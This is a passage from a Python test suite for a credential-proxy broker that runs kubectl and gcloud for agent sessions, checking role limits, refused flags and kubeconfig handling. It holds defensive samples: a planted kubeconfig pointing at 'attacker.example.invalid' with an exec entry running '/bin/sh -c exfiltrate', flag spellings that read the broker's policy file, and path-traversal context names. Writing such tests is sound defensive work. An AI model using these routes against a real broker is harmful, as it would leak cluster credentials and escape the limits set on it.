        with mock.patch.object(CredentialProxyHandler, "_json", recording):
            status, _ = self.post({"argv": ["kubectl", "get", "pods"]})

        self.assertEqual(200, status)
        self.assertEqual([1], seen)
        self.assert_slot_released(CredentialProxyHandler.executor)

    def test_a_replacement_character_is_three_bytes_on_the_wire(self):
        # ASCII-escaped JSON writes `\ufffd`, six bytes for one byte that was
        # not UTF-8; the bound on the decoded text was sized for the three
        # bytes of the character itself.
        stub = Path(CredentialProxyHandler.executor.executables["kubectl"])
        stub.write_text("#!/bin/bash\nprintf '\\377'\n", encoding="utf-8")
        connection = http.client.HTTPConnection("127.0.0.1", self.server.server_port)
        connection.request(
            "POST",
            "/v1/exec",
            body=json.dumps({"argv": ["kubectl", "get", "pods"]}),
            headers={"Content-Type": "application/json"},
        )
        response = connection.getresponse()
        body = response.read()
        connection.close()

        self.assertEqual(200, response.status)
        self.assertIn("\ufffd".encode("utf-8"), body)
        self.assertNotIn(b"\\ufffd", body)
        self.assertEqual("\ufffd", json.loads(body)["stdout"])

    def test_the_exec_route_hands_its_connection_to_the_executor(self):
        # The watch that ends an abandoned command needs the socket the request
        # arrived on; the route is where it is known.
        seen = []
        original = CredentialProxyHandler.executor.execute

        def recording(argv, **kwargs):
            seen.append(kwargs.get("caller"))
            return original(argv, **kwargs)

        with mock.patch.object(CredentialProxyHandler.executor, "execute", recording):
            status, body = self.post({"argv": ["kubectl", "get", "pods"]})

        self.assertEqual(200, status)
        self.assertEqual("pods\n", body["stdout"])
        self.assertEqual(1, len(seen))
        self.assertIsInstance(seen[0], socket.socket)


class SessionSlotCapTest(unittest.TestCase):
    """A session's share of the broker's command pool is bounded on its own."""

    def test_the_limit_comes_from_the_env_with_a_default(self):
        with mock.patch.dict(os.environ, {}, clear=True):
            self.assertEqual(credential_proxy.DEFAULT_SESSION_MAX_CONCURRENT_COMMANDS, credential_proxy.session_slot_limit_from_env())
        with mock.patch.dict(os.environ, {credential_proxy.ENV_SESSION_MAX_CONCURRENT_COMMANDS: "5"}, clear=True):
            self.assertEqual(5, credential_proxy.session_slot_limit_from_env())
        for bad in ("0", "-1", "two"):
            with self.subTest(bad=bad):
                with mock.patch.dict(os.environ, {credential_proxy.ENV_SESSION_MAX_CONCURRENT_COMMANDS: bad}, clear=True):
                    with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
                        self.assertEqual(
                            credential_proxy.DEFAULT_SESSION_MAX_CONCURRENT_COMMANDS,
                            credential_proxy.session_slot_limit_from_env(),
                        )

    def test_only_the_session_role_is_counted_and_the_count_releases(self):
        slots = credential_proxy.SessionSlots(1)
        with slots.acquire(credential_proxy.CALLER_ROLE_SESSION):
            with self.assertRaises(credential_proxy.CommandSlotUnavailable) as refused:
                with slots.acquire(credential_proxy.CALLER_ROLE_SESSION):
                    pass
            self.assertIn("session", str(refused.exception))
            # The shell and a roleless caller are not counted against it.
            with slots.acquire(credential_proxy.CALLER_ROLE_SHELL):
                with slots.acquire(""):
                    pass
        # Released on exit, so the next session command is admitted.
        with slots.acquire(credential_proxy.CALLER_ROLE_SESSION):
            pass

    def test_a_second_concurrent_session_command_is_answered_busy(self):
        temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(temp_dir.cleanup)
        policy_path = Path(temp_dir.name) / "policy.json"
        policy_path.write_text(json.dumps({"blockedMessage": "blocked", "rules": []}), encoding="utf-8")
        CredentialProxyHandler.policy = Policy.load(str(policy_path))
        CredentialProxyHandler.executor = CommandExecutor(
            timeout_seconds=10, max_output_bytes=4096, state_dir=str(Path(temp_dir.name) / "state"), scoped_pool=None
        )
        stub_dir = Path(temp_dir.name) / "bin"
        stub_dir.mkdir()
        stub = stub_dir / "kubectl"
        stub.write_text("#!/bin/bash\nsleep 2\necho pods\n", encoding="utf-8")
        stub.chmod(0o755)
        CredentialProxyHandler.executor.executables["kubectl"] = str(stub)
        CredentialProxyHandler.max_request_bytes = 65536
        CredentialProxyHandler.enforce_read_only = True
        CredentialProxyHandler.session_slots = credential_proxy.SessionSlots(1)
        self.addCleanup(setattr, CredentialProxyHandler, "session_slots", None)
        server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)

        # One patch for every thread: the role rides on a request header, so
        # concurrent requests cannot overwrite each other's principal.
        def authenticated(handler):
            return credential_proxy.Principal(
                workload="system:serviceaccount:ns:x", uid="u", groups=(), role=handler.headers.get("X-Test-Role", "")
            )

        def post_as(role):
            request = urllib.request.Request(
                f"http://127.0.0.1:{server.server_port}/v1/exec",
                data=json.dumps({"argv": ["kubectl", "get", "pods"]}).encode("utf-8"),
                headers={"Content-Type": "application/json", "X-Test-Role": role},
                method="POST",
            )
            try:
                with urllib.request.urlopen(request) as response:
                    return response.status, json.loads(response.read())
            except urllib.error.HTTPError as error:
                with error:
                    return error.code, json.loads(error.read())

        results = {}
        def run(name, role):
            results[name] = post_as(role)
        with mock.patch.object(CredentialProxyHandler, "_authenticated", authenticated):
            first = threading.Thread(target=run, args=("first", credential_proxy.CALLER_ROLE_SESSION))
            first.start()
            time.sleep(0.5)
            second = threading.Thread(target=run, args=("second", credential_proxy.CALLER_ROLE_SESSION))
            shell = threading.Thread(target=run, args=("shell", credential_proxy.CALLER_ROLE_SHELL))
            second.start(); shell.start()
            for thread in (first, second, shell):
                thread.join(timeout=15)
        self.assertEqual(200, results["first"][0], results["first"])
        self.assertEqual(503, results["second"][0], results["second"])
        self.assertEqual("CREDENTIAL_PROXY_BUSY", results["second"][1]["code"])
        self.assertIn("session", results["second"][1]["error"])
        self.assertEqual(200, results["shell"][0], results["shell"])


class SessionRoleExecutableTest(unittest.TestCase):
    """The session caller runs kubectl and gcloud through the broker and nothing else."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        policy_path = Path(self.temp_dir.name) / "policy.json"
        policy_path.write_text(json.dumps({"blockedMessage": "blocked", "rules": []}), encoding="utf-8")
        CredentialProxyHandler.policy = Policy.load(str(policy_path))
        CredentialProxyHandler.executor = CommandExecutor(
            timeout_seconds=5,
            max_output_bytes=4096,
            state_dir=str(Path(self.temp_dir.name) / "state"),
            scoped_pool=None,
        )
        stub_dir = Path(self.temp_dir.name) / "bin"
        stub_dir.mkdir()
        for name in ("kubectl", "git"):
            stub = stub_dir / name
            stub.write_text("#!/bin/bash\necho ran-$0\n", encoding="utf-8")
            stub.chmod(0o755)
            CredentialProxyHandler.executor.executables[name] = str(stub)
        CredentialProxyHandler.max_request_bytes = 65536
        CredentialProxyHandler.enforce_read_only = True
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)

    def post_as(self, role, payload):
        principal = credential_proxy.Principal(
            workload="system:serviceaccount:ns:agent-a2a-session", uid="u", groups=(), role=role
        )
        request = urllib.request.Request(
            f"http://127.0.0.1:{self.server.server_port}/v1/exec",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with mock.patch.object(CredentialProxyHandler, "_authenticated", return_value=principal):
            try:
                with urllib.request.urlopen(request) as response:
                    return response.status, json.loads(response.read())
            except urllib.error.HTTPError as error:
                with error:
                    return error.code, json.loads(error.read())

    def test_the_table(self):
        for role, executable, want in (
            (credential_proxy.CALLER_ROLE_SESSION, "kubectl", True),
            (credential_proxy.CALLER_ROLE_SESSION, "gcloud", True),
            (credential_proxy.CALLER_ROLE_SESSION, "git", False),
            (credential_proxy.CALLER_ROLE_SESSION, "gh", False),
            (credential_proxy.CALLER_ROLE_SHELL, "git", True),
            ("", "gh", True),
        ):
            with self.subTest(role=role, executable=executable):
                self.assertEqual(want, credential_proxy.executable_permitted(role, executable))

    def test_git_from_a_session_is_refused_by_the_route_before_the_role(self):
        # /v1/exec admits only EXEC_ROUTE_EXECUTABLES for every role, so a
        # session asking for git meets the route's own refusal first; the role
        # check below is never reached for an executable the route refuses.
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            status, body = self.post_as(credential_proxy.CALLER_ROLE_SESSION, {"argv": ["git", "status"]})
        self.assertEqual(403, status)
        self.assertEqual("SECURITY_POLICY_BLOCKED", body["code"])
        self.assertEqual(credential_proxy.RULE_EXECUTABLE_ALLOWLIST, body["rule"])

    def test_the_role_check_stands_behind_the_route(self):
        # Widen the route the way the git-routing tests do and the session is
        # still held to its two CLIs, with the rule the shim prints, while the
        # shell runs what the route now carries. This is what the role check
        # buys once the route list and the session list are the same two names.
        routed = (*credential_proxy.EXEC_ROUTE_EXECUTABLES, "git")
        with mock.patch.object(credential_proxy, "EXEC_ROUTE_EXECUTABLES", routed):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
                status, body = self.post_as(credential_proxy.CALLER_ROLE_SESSION, {"argv": ["git", "status"]})
            self.assertEqual(403, status)
            self.assertEqual("SECURITY_POLICY_BLOCKED", body["code"])
            self.assertEqual(credential_proxy.RULE_CALLER_EXECUTABLE, body["rule"])
            self.assertIn("session", body["message"])
            status, body = self.post_as(credential_proxy.CALLER_ROLE_SHELL, {"argv": ["git", "status"]})
            self.assertEqual(200, status, body)

    def test_a_read_from_a_session_runs(self):
        status, body = self.post_as(credential_proxy.CALLER_ROLE_SESSION, {"argv": ["kubectl", "get", "pods"]})
        self.assertEqual(200, status, body)
        self.assertEqual(0, body["exitCode"])

    def test_a_mutation_from_a_session_is_refused_read_only(self):
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            status, body = self.post_as(
                credential_proxy.CALLER_ROLE_SESSION, {"argv": ["kubectl", "delete", "pod", "x"]}
            )
        self.assertEqual(403, status)
        self.assertEqual("kubernetes.read-only", body["rule"])

    def test_the_table_of_kubectl_flags(self):
        S = credential_proxy.CALLER_ROLE_SESSION
        for role, argv, want in (
            # The file routes the fence exists to close, in every spelling
            # pflag accepts: separate value, attached, `=`, and clustered
            # behind a boolean shorthand.
            (S, ["kubectl", "get", "-f", "/etc/credential-proxy/policy.json"], "-f"),
            (S, ["kubectl", "get", "-f=https://example.invalid/x.yaml"], "-f"),
            (S, ["kubectl", "get", "-fx.yaml"], "-f"),
            (S, ["kubectl", "get", "-Af", "/etc/credential-proxy/policy.json"], "-f"),
            (S, ["kubectl", "get", "-ARf", "dir/"], "-R"),
            (S, ["kubectl", "get", "--filename", "x.yaml"], "--filename"),
            (S, ["kubectl", "get", "-k", "overlay/"], "-k"),
            (S, ["kubectl", "get", "--kustomize=overlay/"], "--kustomize"),
            (S, ["kubectl", "get", "--recursive", "--filename", "dir/"], "--recursive"),
            # File-backed output formats read a file on the broker too.
            (S, ["kubectl", "get", "ns", "-o", "go-template-file=../content-workspaces/r/values.yaml"], "--output"),
            (S, ["kubectl", "get", "ns", "-ogo-template-file=/etc/x"], "--output"),
            (S, ["kubectl", "get", "ns", "--output=jsonpath-file=/etc/x"], "--output"),
            (S, ["kubectl", "get", "ns", "--output", "custom-columns-file=x"], "--output"),
            (S, ["kubectl", "get", "ns", "-o", "templatefile=x"], "--output"),
            # Streaming flags hold a broker slot until the deadline; not for a
            # session. `logs -f` is refused as a flag the session may not pass,
            # not as a file.
            (S, ["kubectl", "get", "pods", "-w"], "-w"),
            (S, ["kubectl", "get", "pods", "--watch"], "--watch"),
            (S, ["kubectl", "logs", "pod/x", "-f"], "-f"),
            (S, ["kubectl", "logs", "pod/x", "--follow"], "--follow"),
            # Unknown or unlisted flags are refused rather than guessed at.
            (S, ["kubectl", "get", "pods", "--raw", "/api"], "--raw"),
            (S, ["kubectl", "get", "pods", "-v=9"], "-v"),
            (S, ["kubectl", "get", "pods", "--server=https://x"], "--server"),
            # The inspection surface passes, in the spellings a model emits.
            (S, ["kubectl", "get", "pods", "-n", "kubeagents-system", "--no-headers"], None),
            (S, ["kubectl", "get", "pods", "-A", "-o", "wide"], None),
            (S, ["kubectl", "get", "pods", "-Ao", "json"], None),
            (S, ["kubectl", "get", "pods", "-ojson"], None),
            (S, ["kubectl", "get", "pods", "-o=yaml", "--show-labels"], None),
            (S, ["kubectl", "get", "pods", "-o", "jsonpath={.items[*].metadata.name}"], None),
            (S, ["kubectl", "get", "pods", "-o", "custom-columns=NAME:.metadata.name"], None),
            (S, ["kubectl", "get", "pods", "-o", "go-template={{range .items}}{{.metadata.name}}{{end}}"], None),
            (S, ["kubectl", "get", "pods", "-l", "app=x", "--field-selector=status.phase=Running", "--sort-by=.metadata.name"], None),
            (S, ["kubectl", "describe", "pod", "x", "-n", "ns", "--context=gke_p_l_c"], None),
            (S, ["kubectl", "logs", "pod/x", "-c", "main", "--tail=50", "--since=1h", "-p", "--timestamps"], None),
            (S, ["kubectl", "logs", "deploy/x", "--all-containers", "--prefix"], None),
            (S, ["kubectl", "top", "pods", "-n", "ns", "--containers"], None),
            (S, ["kubectl", "events", "-n", "ns", "--for", "pod/x", "--types=Warning"], None),
            (S, ["kubectl", "rollout", "history", "deploy/x", "-n", "ns"], None),
            # The two read verbs that wait, and the two flags that name a
            # bound, hold a broker slot past its one-shot deadline.
            (S, ["kubectl", "wait", "--for=condition=Ready", "pod/x"], "wait"),
            (S, ["kubectl", "rollout", "status", "deploy/x", "-n", "ns"], "rollout status"),
            (S, ["kubectl", "-n", "ns", "rollout", "status", "deploy/x"], "rollout status"),
            (S, ["kubectl", "get", "pods", "--timeout=5m"], "--timeout"),
            (S, ["kubectl", "get", "pods", "--request-timeout", "0"], "--request-timeout"),
            (S, ["kubectl", "auth", "can-i", "get", "pods", "-n", "ns"], None),
            (S, ["kubectl", "api-resources", "--namespaced=true", "--verbs=list"], None),
            (S, ["kubectl", "explain", "pods.spec.containers"], None),
            (S, ["kubectl", "version", "--client"], None),
            (S, ["kubectl", "get", "pods", "--kubeconfig=gke_p_l_c"], None),
            (S, ["kubectl", "--help"], None),
            # Other roles and other executables are untouched.
            (credential_proxy.CALLER_ROLE_SHELL, ["kubectl", "get", "-Af", "x.yaml"], None),
            ("", ["kubectl", "get", "-o", "go-template-file=x"], None),
            (S, ["gcloud", "projects", "list", "--format=json"], None),
        ):
            with self.subTest(role=role, argv=argv):
                self.assertEqual(want, credential_proxy.session_kubectl_flag_refusal(role, argv))

    def test_a_clustered_file_flag_from_a_session_is_refused_before_it_reaches_kubectl(self):
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            status, body = self.post_as(
                credential_proxy.CALLER_ROLE_SESSION,
                {"argv": ["kubectl", "get", "-Af", "/etc/credential-proxy/policy.json"]},
            )
        self.assertEqual(403, status)
        self.assertEqual("SECURITY_POLICY_BLOCKED", body["code"])
        self.assertEqual(credential_proxy.RULE_CALLER_KUBECTL_FLAG, body["rule"])
        self.assertIn("-f", body["message"])

    def test_a_file_backed_output_format_from_a_session_is_refused(self):
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            status, body = self.post_as(
                credential_proxy.CALLER_ROLE_SESSION,
                {"argv": ["kubectl", "get", "ns", "-o", "go-template-file=/etc/credential-proxy/policy.json"]},
            )
        self.assertEqual(403, status)
        self.assertEqual(credential_proxy.RULE_CALLER_KUBECTL_FLAG, body["rule"])
        self.assertIn("--output", body["message"])

    def test_the_shell_still_passes_a_file_argument_to_kubectl(self):
        status, body = self.post_as(credential_proxy.CALLER_ROLE_SHELL, {"argv": ["kubectl", "get", "-f", "x.yaml"]})
        self.assertEqual(200, status, body)


class ChildMemoryBudgetDerivationTest(unittest.TestCase):
    """Where the broker learns its memory limit (design §2.4)."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.cgroup = Path(self.tmp.name) / "memory.max"

    def test_the_downward_api_variable_wins(self):
        self.cgroup.write_text("536870912\n", encoding="utf-8")
        limit = credential_proxy.child_memory_limit_bytes(
            {credential_proxy.ENV_MEMORY_LIMIT_BYTES: "1073741824"}, cgroup_path=self.cgroup
        )
        self.assertEqual(1073741824, limit)

    def test_the_cgroup_file_is_the_fallback(self):
        self.cgroup.write_text("536870912\n", encoding="utf-8")
        self.assertEqual(
            536870912, credential_proxy.child_memory_limit_bytes({}, cgroup_path=self.cgroup)
        )

    def test_a_cgroup_without_a_limit_disables_the_budget(self):
        self.cgroup.write_text("max\n", encoding="utf-8")
        self.assertIsNone(credential_proxy.child_memory_limit_bytes({}, cgroup_path=self.cgroup))

    def test_nothing_readable_disables_the_budget(self):
        self.assertIsNone(
            credential_proxy.child_memory_limit_bytes({}, cgroup_path=self.cgroup / "absent")
        )

    def test_a_bad_variable_and_no_cgroup_limit_disables_the_budget(self):
        # Review focus 1: never raise at startup, never budget against zero.
        for raw in ("0", "-1", "lots", "1Gi", ""):
            with self.subTest(raw=raw):
                self.assertIsNone(
                    credential_proxy.child_memory_limit_bytes(
                        {credential_proxy.ENV_MEMORY_LIMIT_BYTES: raw},
                        cgroup_path=self.cgroup / "absent",
                    )
                )

    def test_a_variable_that_is_not_a_positive_integer_falls_through_to_the_cgroup(self):
        self.cgroup.write_text("536870912\n", encoding="utf-8")
        for raw in ("0", "-1", "lots", "1Gi"):
            with self.subTest(raw=raw):
                with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                    limit = credential_proxy.child_memory_limit_bytes(
                        {credential_proxy.ENV_MEMORY_LIMIT_BYTES: raw}, cgroup_path=self.cgroup
                    )
                self.assertEqual(536870912, limit)
                self.assertEqual(1, len(logs.output))
                self.assertIn(
                    f"CREDENTIAL_PROXY_MEMORY_LIMIT_BYTES={raw!r} is not a positive integer "
                    "byte count; ignoring it",
                    logs.output[0],
                )

    def test_an_empty_variable_reads_as_unset_without_a_warning(self):
        self.cgroup.write_text("536870912\n", encoding="utf-8")
        with self.assertNoLogs(credential_proxy.LOGGER, level="WARNING"):
            limit = credential_proxy.child_memory_limit_bytes(
                {credential_proxy.ENV_MEMORY_LIMIT_BYTES: ""}, cgroup_path=self.cgroup
            )
        self.assertEqual(536870912, limit)

    def test_the_constants_match_the_design(self):
        mib = credential_proxy.MEBIBYTE
        self.assertEqual(128 * mib, credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES)
        self.assertEqual(192 * mib, credential_proxy.BROKER_RESIDENT_RESERVE_BYTES)
        self.assertEqual(128 * mib, credential_proxy.CONTENT_WORKSPACE_RESERVE_BYTES)
        self.assertEqual(6, credential_proxy.OUTPUT_COPIES_PER_COMMAND)
        self.assertEqual("CREDENTIAL_PROXY_MEMORY_LIMIT_BYTES", credential_proxy.ENV_MEMORY_LIMIT_BYTES)
        self.assertEqual(1024 * 1024, mib)
        self.assertEqual("/sys/fs/cgroup/memory.max", credential_proxy.CGROUP_MEMORY_MAX_PATH)
        self.assertEqual("max", credential_proxy.CGROUP_NO_LIMIT)
        self.assertEqual(2, credential_proxy.BUDGET_MINIMUM_ADMITTED_REQUESTS)


class CommandExecutorTest(unittest.TestCase):
    CONTEXT = "gke_demo-project_us-central1_cluster-a"

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        # gke_endpoint memoises "does this gcloud support --dns-endpoint" for the
        # life of the process, which is right in the sidecar and wrong here: the
        # first test to reach it caches the answer for a stub gcloud, and every
        # later test inherits it. Reset so each test decides on its own.
        gke_endpoint.reset_cache()
        self.addCleanup(gke_endpoint.reset_cache)

    def tearDown(self):
        self.temp_dir.cleanup()

    def executor(
        self,
        timeout_seconds=5,
        max_output_bytes=1024,
        kubectl_timeout_seconds=credential_proxy.DEFAULT_KUBECTL_TIMEOUT_SECONDS,
        max_concurrent_commands=credential_proxy.DEFAULT_MAX_CONCURRENT_COMMANDS,
        memory_limit_bytes=None,
    ):
        return CommandExecutor(
            timeout_seconds=timeout_seconds,
            max_output_bytes=max_output_bytes,
            state_dir=self.temp_dir.name,
            scoped_pool=None,
            kubectl_timeout_seconds=kubectl_timeout_seconds,
            max_concurrent_commands=max_concurrent_commands,
            memory_limit_bytes=memory_limit_bytes,
        )

    def caller_kubeconfig(self, executor, name="kubeconfig.yaml", body=None):
        """A kubeconfig where the agent can reach it — i.e. one to distrust.

        Nothing in the proxy opens this file; it exists so a test can plant one
        and then show that naming it gets the request refused.
        """
        path = executor.workspace_dir / name
        path.parent.mkdir(parents=True, exist_ok=True)
        if body is None:
            body = f"apiVersion: v1\nkind: Config\ncurrent-context: {self.CONTEXT}\n"
        path.write_text(body, encoding="utf-8")
        return path

    def seed_managed(self, executor, context=None):
        """Pretend a previous `get-credentials` already warmed the cache."""
        context = context or self.CONTEXT
        managed = executor.kubeconfig_dir / f"{context}.yaml"
        managed.write_text(
            f"apiVersion: v1\nkind: Config\ncurrent-context: {context}\n", encoding="utf-8"
        )
        return managed

    def fake_gcloud(self, executor):
        """Swap in a gcloud that writes a kubeconfig the way the real one does.

        Only the destination and the context name matter to anything under test,
        so the generated document is deliberately minimal.
        """
        stub = Path(self.temp_dir.name) / "fake-gcloud"
        stub.write_text(
            textwrap.dedent(
                """\
                #!/bin/bash
                set -u
                # The endpoint decision in front of a fetch runs a help probe
                # and a describe through this same stub; neither writes a
                # kubeconfig, as the real gcloud does not.
                case " $* " in
                    *" --help "*) echo "  --dns-endpoint  Use the DNS endpoint."; exit 0 ;;
                    *" describe "*) echo "{}"; exit 0 ;;
                esac
                project=""; location=""; cluster=""
                for arg in "$@"; do
                    case "$arg" in
                        --project=*) project="${arg#--project=}" ;;
                        --location=*) location="${arg#--location=}" ;;
                        container|clusters|get-credentials|--*) ;;
                        *) [ -n "$cluster" ] || cluster="$arg" ;;
                    esac
                done
                ctx="gke_${project}_${location}_${cluster}"
                printf 'apiVersion: v1\\nkind: Config\\ncurrent-context: %s\\n' "$ctx" \\
                    > "$KUBECONFIG"
                """
            ),
            encoding="utf-8",
        )
        stub.chmod(0o755)
        executor.executables["gcloud"] = str(stub)
        return executor

    def fake_git(self, executor):
        """Swap in a git that reports the environment it was handed.

        The stub has to be called `git`: the executor decides whether a command
        gets a commit identity from the executable's own name, so a `fake-git`
        would test nothing. Hence the directory rather than a suffixed filename.
        """
        stub_dir = Path(self.temp_dir.name) / "fake-bin"
        stub_dir.mkdir(parents=True, exist_ok=True)
        stub = stub_dir / "git"
        stub.write_text("#!/bin/bash\nenv\n", encoding="utf-8")
        stub.chmod(0o755)
        executor.executables["git"] = str(stub)
        return executor

    def fake_kubectl(self, executor, body="exit 0"):
        """Swap in a kubectl that does whatever the test needs it to do.

        Named `kubectl` in a directory of its own for the same reason `fake_git`
        is: a suffixed filename would not be the executable the proxy resolves.
        """
        stub_dir = Path(self.temp_dir.name) / "fake-kubectl-bin"
        stub_dir.mkdir(parents=True, exist_ok=True)
        stub = stub_dir / "kubectl"
        stub.write_text(f"#!/bin/bash\n{body}\n", encoding="utf-8")
        stub.chmod(0o755)
        executor.executables["kubectl"] = str(stub)
        return executor

    def dispatched(self, executor, argv):
        """The argv and per-command deadline `execute` settles on for `argv`.

        Both halves of the timeout decision are made in `execute` and are
        invisible from the outside, so the assertions need the call it makes
        rather than the result it returns.
        """
        seen = []
        original = executor._execute

        def record(inner_argv, **kwargs):
            seen.append((list(inner_argv), kwargs.get("timeout_seconds")))
            return original(inner_argv, **kwargs)

        with mock.patch.object(executor, "_execute", record):
            executor.execute(list(argv))

        self.assertEqual(1, len(seen))
        return seen[0]

    def dumped_environment(self, result):
        """Parse an `env` dump, insisting it arrived whole.

        A truncated dump would make every `assertNotIn` below pass for the wrong
        reason, so the size check is part of reading it.
        """
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertFalse(result.truncated, "environment dump was truncated")
        return dict(
            line.split("=", 1) for line in result.stdout.splitlines() if "=" in line
        )

    def git_environment(self, executor, argv=("git", "commit", "-m", "fleet audit")):
        """The environment a proxied git subprocess actually receives."""
        return self.dumped_environment(self.fake_git(executor).execute(list(argv)))

    def test_rejects_unsupported_executable(self):
        with self.assertRaisesRegex(ValueError, "not supported"):
            self.executor().execute(["env"])

    def test_rejects_shell_command_string(self):
        with self.assertRaisesRegex(ValueError, "list of strings"):
            self.executor().execute("gcloud auth list")

    def test_rejects_working_directory_outside_shared_workspace(self):
        with self.assertRaisesRegex(ValueError, "outside the shared workspace"):
            self.executor().execute(["git", "status"], cwd="/")

    def test_kubeconfig_defaults_to_the_sidecar_context(self):
        # Omitting the field must not disturb the bootstrapped context — the
        # Platform Agent sends no KUBECONFIG and relies on this default.
        executor = self.executor()
        result = executor._execute(["/bin/sh", "-c", 'printf "%s" "$KUBECONFIG"'])
        self.assertEqual(executor.environment["KUBECONFIG"], result.stdout)

    # ---- The caller's kubeconfig is a name, never content -------------------

    def test_command_runs_against_the_proxy_copy_not_the_callers(self):
        executor = self.executor()
        managed = self.seed_managed(executor)

        resolved = executor._resolve_kubeconfig(self.CONTEXT)

        self.assertEqual(managed, resolved)
        # The whole point: what kubectl opens is somewhere the agent cannot write.
        self.assertFalse(executor._within_workspace(resolved))

    def test_a_path_is_not_a_context_name(self):
        # The escape this mechanism exists to close. Every field in the planted
        # document is one the proxy would otherwise act on: `exec.command` runs
        # next to the credentials, `server` picks where the minted token is sent,
        # and `insecure-skip-tls-verify` removes the obstacle to sending it
        # there. None of it can be seen by the policy engine, whose rules match
        # argv. The proxy never opens the file, so a request that names a path
        # instead of a context is refused by the grammar before anything reads
        # it — the caller's shim is what turns a file into a name.
        executor = self.executor()
        self.seed_managed(executor)
        hostile = self.caller_kubeconfig(
            executor,
            body=(
                "apiVersion: v1\n"
                "kind: Config\n"
                f"current-context: {self.CONTEXT}\n"
                "clusters:\n"
                f"- name: {self.CONTEXT}\n"
                "  cluster:\n"
                "    server: https://attacker.example.invalid\n"
                "    insecure-skip-tls-verify: true\n"
                "users:\n"
                f"- name: {self.CONTEXT}\n"
                "  user:\n"
                "    exec:\n"
                "      command: /bin/sh\n"
                '      args: ["-c", "exfiltrate"]\n'
            ),
        )

        with self.assertRaisesRegex(ValueError, "not a GKE context name"):
            executor._resolve_kubeconfig(str(hostile))

    def test_kubeconfig_flag_is_rerouted_as_well_as_the_environment(self):
        # `--kubeconfig` takes precedence over KUBECONFIG in kubectl and reaches
        # the proxy untouched — no policy rule mentions it. Rewriting only the
        # environment would leave the flag as a way straight back to a file the
        # agent controls.
        executor = self.executor()
        managed = self.seed_managed(executor)

        joined, joined_path = executor._reroute_kubeconfig_flags(
            ["kubectl", f"--kubeconfig={self.CONTEXT}", "get", "pods"]
        )
        separate, separate_path = executor._reroute_kubeconfig_flags(
            ["kubectl", "--kubeconfig", self.CONTEXT, "get", "pods"]
        )

        self.assertEqual(["kubectl", f"--kubeconfig={managed}", "get", "pods"], joined)
        self.assertEqual(["kubectl", "--kubeconfig", str(managed), "get", "pods"], separate)
        self.assertEqual(managed, joined_path)
        self.assertEqual(managed, separate_path)

        untouched, no_path = executor._reroute_kubeconfig_flags(["kubectl", "get", "pods"])
        self.assertEqual(["kubectl", "get", "pods"], untouched)
        self.assertIsNone(no_path, "a request with no flag must not report one")

    def test_a_flag_carrying_a_path_is_refused(self):
        executor = self.executor()
        with self.assertRaisesRegex(ValueError, "not a GKE context name"):
            executor._reroute_kubeconfig_flags(
                ["kubectl", "--kubeconfig=/etc/kubeconfig.yaml", "get", "pods"]
            )

    def test_a_kubeconfig_after_the_separator_is_the_remote_commands(self):
        # `kubectl exec pod -- tool --kubeconfig f`: kubectl stops reading its
        # own flags at `--`, and so does the shim, which forwards `f` as the
        # path it is. Resolving it here refused the whole request as a
        # non-GKE context name.
        executor = self.executor()
        managed = self.seed_managed(executor)
        for remote in ("--kubeconfig", "/remote/path.yaml"), ("--kubeconfig=/remote/path.yaml",):
            with self.subTest(remote=remote):
                argv = ["kubectl", "exec", "pod/x", "--", "tool", *remote]
                rewritten, path = executor._reroute_kubeconfig_flags(argv)
                self.assertEqual(argv, rewritten)
                self.assertIsNone(path)

                pinned = ["kubectl", f"--kubeconfig={self.CONTEXT}", *argv[1:]]
                rewritten, path = executor._reroute_kubeconfig_flags(pinned)
                self.assertEqual(
                    ["kubectl", f"--kubeconfig={managed}", *argv[1:]], rewritten
                )
                self.assertEqual(managed, path)

    def test_the_broker_accepts_every_argv_the_shim_rewrites(self):
        # The contract, end to end: what `resolve_kubeconfig_flags` leaves in
        # argv is what this side resolves. A shim test alone stubs the broker
        # with a 200 and cannot see the two disagree about where flags end.
        executor = self.executor()
        managed = self.seed_managed(executor)
        local = self.caller_kubeconfig(executor)
        argv = [
            "kubectl", "--kubeconfig", str(local), "exec", "pod/x",
            "--", "tool", "--kubeconfig", "/remote/path.yaml",
        ]
        shimmed = credential_proxy_client.resolve_kubeconfig_flags(argv)
        rewritten, path = executor._reroute_kubeconfig_flags(shimmed)
        self.assertEqual(managed, path)
        self.assertEqual(str(managed), rewritten[2])
        self.assertEqual(argv[3:], rewritten[3:])

    def test_kubeconfig_surrounding_whitespace_is_ignored(self):
        # Profile .env files routinely carry a trailing newline, and the shim
        # forwards what it read; a name that only differs by whitespace must
        # still resolve, not silently fail.
        executor = self.executor()
        managed = self.seed_managed(executor)
        self.assertEqual(managed, executor._resolve_kubeconfig(f"  {self.CONTEXT}\n"))

    # ---- Failing closed ------------------------------------------------------

    def test_rejects_a_context_that_is_not_a_gke_name(self):
        # Without a parseable triple there is no cluster to re-fetch, so there is
        # no way to serve the request at all: the name is the only thing the
        # proxy has to go on.
        executor = self.executor()
        with self.assertRaisesRegex(ValueError, "not a GKE context name"):
            executor._resolve_kubeconfig("minikube")

    def test_rejects_a_context_name_that_could_traverse(self):
        # The name becomes a filename under kubeconfig_dir, so a separator or a
        # `..` component in it would be a write outside that directory.
        executor = self.executor()
        for hostile in (
            "gke_..___..___etc",
